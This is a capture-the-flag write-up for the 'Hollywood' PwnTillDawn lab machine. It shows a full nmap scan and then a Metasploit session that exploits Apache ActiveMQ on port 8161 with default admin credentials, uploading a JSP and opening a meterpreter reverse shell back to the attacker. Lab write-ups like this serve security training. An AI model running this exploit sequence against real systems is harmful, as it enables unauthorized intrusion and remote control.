---
title: Hollywood
category: [writeups,PwnTillDawn]
tags: [Windows,ActiveMQ]
---
# Hollywood
- Difficulty : `easy`
- IP Address : `10.150.150.219`
- Operating System : `Windows`

# Table of Content
- [Nmap Result](#nmap-result)
- [Method to solve the challenge](#method-to-solve-the-challenge)


## Nmap Result
```
Nmap scan report for 10.150.150.219
Host is up, received syn-ack (0.26s latency).
Scanned at 2022-07-21 06:29:20 UTC for 212s

PORT      STATE SERVICE        REASON  VERSION
21/tcp    open  ftp            syn-ack FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
25/tcp    open  smtp           syn-ack Mercury/32 smtpd (Mail server account Maiser)
|_smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME, 
79/tcp    open  finger         syn-ack Mercury/32 fingerd
| finger: Login: Admin         Name: Mail System Administrator\x0D
| \x0D
|_[No profile information]\x0D
80/tcp    open  http           syn-ack Apache httpd 2.4.34 ((Win32) OpenSSL/1.0.2o PHP/5.6.38)
|_http-favicon: Unknown favicon MD5: 56F7C04657931F2D0B79371B2D6E9820
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.34 (Win32) OpenSSL/1.0.2o PHP/5.6.38
| http-title: Welcome to XAMPP
|_Requested resource was http://10.150.150.219/dashboard/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
105/tcp   open  ph-addressbook syn-ack Mercury/32 PH addressbook server
106/tcp   open  pop3pw         syn-ack Mercury/32 poppass service
110/tcp   open  pop3           syn-ack Mercury/32 pop3d
|_pop3-capabilities: TOP USER UIDL EXPIRE(NEVER) APOP
135/tcp   open  msrpc          syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn    syn-ack Microsoft Windows netbios-ssn
143/tcp   open  imap           syn-ack Mercury/32 imapd 4.62
|_imap-capabilities: AUTH=PLAIN IMAP4rev1 CAPABILITY OK X-MERCURY-1A0001 complete
443/tcp   open  ssl/http       syn-ack Apache httpd 2.4.34 ((Win32) OpenSSL/1.0.2o PHP/5.6.38)
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: Apache/2.4.34 (Win32) OpenSSL/1.0.2o PHP/5.6.38
| http-title: Welcome to XAMPP
|_Requested resource was https://10.150.150.219/dashboard/
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
| SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds   syn-ack Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
554/tcp   open  rtsp?          syn-ack
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
1883/tcp  open  mqtt           syn-ack
|_mqtt-subscribe: ERROR: Script execution failed (use -d to debug)
2224/tcp  open  http           syn-ack Mercury/32 httpd
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Mercury HTTP Services
2869/tcp  open  http           syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
3306/tcp  open  mysql          syn-ack MariaDB (unauthorized)
5672/tcp  open  amqp?          syn-ack
|_amqp-info: ERROR: AMQP:handshake connection closed unexpectedly while reading frame header
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GetRequest, HTTPOptions, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    AMQP
8009/tcp  open  ajp13          syn-ack Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8161/tcp  open  http           syn-ack Jetty 8.1.16.v20140903
|_http-favicon: Unknown favicon MD5: 05664FB0C7AFCD6436179437E31F3AA6
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: Jetty(8.1.16.v20140903)
|_http-title: Apache ActiveMQ
10243/tcp open  http           syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49153/tcp open  msrpc          syn-ack Microsoft Windows RPC
49155/tcp open  msrpc          syn-ack Microsoft Windows RPC
49157/tcp open  msrpc          syn-ack Microsoft Windows RPC
49251/tcp open  tcpwrapped     syn-ack
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5672-TCP:V=7.80%I=7%D=7/21%Time=62D8F24E%P=x86_64-alpine-linux-musl
SF:%r(GetRequest,8,"AMQP\0\x01\0\0")%r(HTTPOptions,8,"AMQP\0\x01\0\0")%r(R
SF:TSPRequest,8,"AMQP\0\x01\0\0")%r(RPCCheck,8,"AMQP\0\x01\0\0")%r(DNSVers
SF:ionBindReqTCP,8,"AMQP\0\x01\0\0")%r(DNSStatusRequestTCP,8,"AMQP\0\x01\0
SF:\0")%r(SSLSessionReq,8,"AMQP\0\x01\0\0")%r(TerminalServerCookie,8,"AMQP
SF:\0\x01\0\0")%r(TLSSessionReq,8,"AMQP\0\x01\0\0")%r(Kerberos,8,"AMQP\0\x
SF:01\0\0")%r(SMBProgNeg,8,"AMQP\0\x01\0\0")%r(X11Probe,8,"AMQP\0\x01\0\0"
SF:)%r(FourOhFourRequest,8,"AMQP\0\x01\0\0")%r(LPDString,8,"AMQP\0\x01\0\0
SF:")%r(LDAPSearchReq,8,"AMQP\0\x01\0\0")%r(LDAPBindReq,8,"AMQP\0\x01\0\0"
SF:)%r(SIPOptions,8,"AMQP\0\x01\0\0")%r(LANDesk-RC,8,"AMQP\0\x01\0\0")%r(T
SF:erminalServer,8,"AMQP\0\x01\0\0")%r(NCP,8,"AMQP\0\x01\0\0")%r(NotesRPC,
SF:8,"AMQP\0\x01\0\0")%r(WMSRequest,8,"AMQP\0\x01\0\0")%r(oracle-tns,8,"AM
SF:QP\0\x01\0\0")%r(ms-sql-s,8,"AMQP\0\x01\0\0")%r(afp,8,"AMQP\0\x01\0\0")
SF:%r(giop,8,"AMQP\0\x01\0\0");
Service Info: Hosts: localhost, HOLLYWOOD; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1h56m18s, deviation: 4h37m01s, median: 43m37s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 47056/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 15361/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 26574/udp): CLEAN (Failed to receive data)
|   Check 4 (port 59297/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: Hollywood
|   NetBIOS computer name: HOLLYWOOD\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-07-21T15:15:11+08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-07-21T07:15:13
|_  start_date: 2020-04-02T14:13:04
```

# Method to solve the challenge
In this challenge, we will be focusing on website on port 8161 instead of port 80. This is because the website on port 8161 is running `ActiveMQ` which contains a vulnerability which get us a shell.
<br>
![](/assets/img/posts/2022-07-21-Hollywood-1.png)
<br>
In this challenge we will be using metasploit to get the shell.
```
msf6 exploit(multi/http/apache_activemq_upload_jsp) > options 

Module options (exploit/multi/http/apache_activemq_upload_jsp):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   AutoCleanup    true             no        Remove web shells after callback is received
   BasicAuthPass  admin            yes       The password for the specified username
   BasicAuthUser  admin            yes       The username to authenticate as
   JSP                             no        JSP name to use, excluding the .jsp extension (default: random)
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS         10.150.150.219   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          8161             yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                           no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal


msf6 exploit(multi/http/apache_activemq_upload_jsp) > run

[*] Started reverse TCP handler on 10.66.67.2:4444 
[*] Uploading http://10.150.150.219:8161/C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin\../webapps/api//jCtNuhzk.jar
[*] Uploading http://10.150.150.219:8161/C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin\../webapps/api//jCtNuhzk.jsp
[*] Sending stage (58829 bytes) to 10.150.150.219
[+] Deleted C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin\../webapps/api//jCtNuhzk.jsp
[*] Meterpreter session 2 opened (10.66.67.2:4444 -> 10.150.150.219:49310) at 2022-07-21 03:45:33 -0400
[!] This exploit may require manual cleanup of 'C:\Users\User\Desktop\apache-activemq-5.11.1-bin\apache-activemq-5.11.1\bin\../webapps/api//jCtNuhzk.jar' on the target

meterpreter > Interrupt: use the 'exit' command to quit
meterpreter > getuid
Server username: User
```
With simple help of metasploit, we are able to get our shell. Although we are not root in the given shell, we will not perform privilege escalation as the flag is readable by current user.




